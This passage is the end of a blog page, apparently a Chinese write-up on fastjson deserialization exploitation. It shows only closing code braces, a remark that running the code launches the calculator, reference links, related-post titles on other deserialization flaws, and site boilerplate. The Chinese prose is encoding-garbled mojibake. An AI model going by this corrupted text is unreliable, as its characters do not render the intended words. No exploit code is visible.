</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
</span></span></span></code></pre></td></tr></table>
</div>
</div><p>è¿è¡Œåå‡å¼¹å‡ºè®¡ç®—æœºã€‚</p>
<p>ç¡®å®å¯ä»¥ã€‚</p>
<p>å‚è€ƒæ–‡ç« ï¼š</p>
<p><a class="link" href="https://xz.aliyun.com/news/14309"  target="_blank" rel="noopener"
    >https://xz.aliyun.com/news/14309</a></p>
<p><a class="link" href="https://nivi4.notion.site/fastjson-873722f1374b4c4e99cc3283a38dfb37"  target="_blank" rel="noopener"
    >https://nivi4.notion.site/fastjson-873722f1374b4c4e99cc3283a38dfb37</a></p>
<p><a class="link" href="https://tttang.com/archive/1579/#toc_1244"  target="_blank" rel="noopener"
    >https://tttang.com/archive/1579/#toc_1244</a></p>

</section>


    <footer class="article-footer">
    

    
    <section class="article-copyright">
        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <circle cx="12" cy="12" r="9" />
  <path d="M14.5 9a3.5 4 0 1 0 0 6" />
</svg>



        <span>Licensed under CC BY-NC-SA 4.0</span>
    </section>
    </footer>


    
</article>

    

    

<aside class="related-content--wrapper">
    <h2 class="section-title">ç›¸å…³æ–‡ç« </h2>
    <div class="related-content">
        <div class="flex article-list--tile">
            
                
<article class="">
    <a href="/p/apache-tomcat-session-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/">
        
        

        <div class="article-details">
            <h2 class="article-title">Apache Tomcat Session ååºåˆ—åŒ–ä»£ç æ‰§è¡Œæ¼æ´</h2>
        </div>
    </a>
</article>

            
                
<article class="">
    <a href="/p/tomcat%E5%85%B3%E9%94%AE%E7%9F%A5%E8%AF%86%E4%BA%86%E8%A7%A3/">
        
        

        <div class="article-details">
            <h2 class="article-title">Tomcatå…³é”®çŸ¥è¯†äº†è§£</h2>
        </div>
    </a>
</article>

            
                
<article class="">
    <a href="/p/hibernate%E7%BB%84%E4%BB%B6%E7%9A%84%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/">
        
        

        <div class="article-details">
            <h2 class="article-title">hibernateç»„ä»¶çš„ååºåˆ—åŒ–æ¼æ´</h2>
        </div>
    </a>
</article>

            
                
<article class="">
    <a href="/p/jdk17%E4%B8%8B%E7%9A%84%E5%8F%8D%E5%B0%84%E7%BB%95%E8%BF%87/">
        
        

        <div class="article-details">
            <h2 class="article-title">JDK17ä¸‹çš„åå°„ç»•è¿‡</h2>
        </div>
    </a>
</article>

            
                
<article class="">
    <a href="/p/fastjson2%E4%B8%8B%E7%9A%84%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%B0%83%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/">
        
        

        <div class="article-details">
            <h2 class="article-title">fastjson2ä¸‹çš„ååºåˆ—åŒ–è°ƒç”¨é“¾åˆ†æ</h2>
        </div>
    </a>
</article>

            
        </div>
    </div>
</aside>

     
    
        
    

    <footer class="site-footer">
    <section class="copyright">
        &copy; 
        
            2020 - 
        
        2025 Example Person
    </section>
    
    <section class="powerby">
        ä½¿ç”¨ <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> æ„å»º <br />
        ä¸»é¢˜ <b><a href="https://github.com/CaiJimmy/hugo-theme-stack" target="_blank" rel="noopener" data-version="3.29.0">Stack</a></b> ç”± <a href="https://jimmycai.com" target="_blank" rel="noopener">Jimmy</a> è®¾è®¡
    </section>
</footer>


    
<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">

    
    <div class="pswp__bg"></div>

    
    <div class="pswp__scroll-wrap">

        
        <div class="pswp__container">
            <div class="pswp__item"></div>
            <div class="pswp__item"></div>
            <div class="pswp__item"></div>
        </div>

        
        <div class="pswp__ui pswp__ui--hidden">

            <div class="pswp__top-bar">

                

                <div class="pswp__counter"></div>

                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>

                <button class="pswp__button pswp__button--share" title="Share"></button>

                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>

                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>

                
                
                <div class="pswp__preloader">
                    <div class="pswp__preloader__icn">
                        <div class="pswp__preloader__cut">
                            <div class="pswp__preloader__donut"></div>
                        </div>
                    </div>
                </div>
            </div>

            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
                <div class="pswp__share-tooltip"></div>
            </div>

            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
            </button>

            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
            </button>

            <div class="pswp__caption">
                <div class="pswp__caption__center"></div>
            </div>

        </div>

    </div>

</div><script 
                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
                defer
                >
            </script><script 
                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
                defer
                >
            </script><link 
                rel="stylesheet" 
                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css"crossorigin="anonymous"
            ><link 
                rel="stylesheet" 
                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css"crossorigin="anonymous"
            >

            </main>
        </div>
        <script 
                src="https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js"integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z&#43;KMkF24hUW8WePSA9HM="crossorigin="anonymous"
                
                >
            </script><script type="text/javascript" src="/ts/main.1e9a3bafd846ced4c345d084b355fb8c7bae75701c338f8a1f8a82c780137826.js" defer></script>
<script>
    (function () {
        const customFont = document.createElement('link');
        customFont.href = "https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap";

        customFont.type = "text/css";
        customFont.rel = "stylesheet";

        document.head.appendChild(customFont);
    }());
</script>

    </body>
</html>
